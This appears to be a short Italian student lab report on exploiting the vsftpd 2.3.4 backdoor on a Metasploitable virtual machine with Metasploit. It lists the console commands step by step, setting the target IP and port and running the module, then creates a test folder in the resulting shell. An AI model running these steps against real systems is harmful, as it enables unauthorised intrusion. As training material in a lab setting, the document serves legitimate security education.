L’obiettivo dell’esercizio era quello di condurre un attacco exploit al servizio vsftpd versione 2.3.4 in esecuzione su una macchina virtuale Metasploitable, utilizzando Metasploit. L’intento era ottenere una sessione interattiva e, successivamente, creare una cartella nella directory root per verificare l’accesso.
Avvio di Metasploit: Per avviare Metasploit, è stato eseguito il comando:msfconsole
Ricerca dell’Exploit: È stato ricercato un exploit per vsftpd tramite il comando:search vsftpd
Dalla lista, è stato selezionato il modulo exploit/unix/ftp/vsftpd_234_backdoor, specifico per la versione vulnerabile 2.3.4 di vsftpd

Dopo aver selezionato l'exploit, il modulo è stato caricato con il comando:use exploit/unix/ftp/vsftpd_234_backdoor
poi imposto l'ip del target
  
set RHOST 192.168.1.231

e poi la porta

set RPORT 21

È stato poi verificato che tutte le opzioni fossero configurate correttamente con il comando: show options

avvio il tutto con exploit o usando run

L’attacco ha cercato di sfruttare la backdoor conosciuta della versione 2.3.4 di vsftpd.

Dopo faccio ls per verificare la presenza della cartella test_metasploit e vado a creala con mkdir test_metasploit
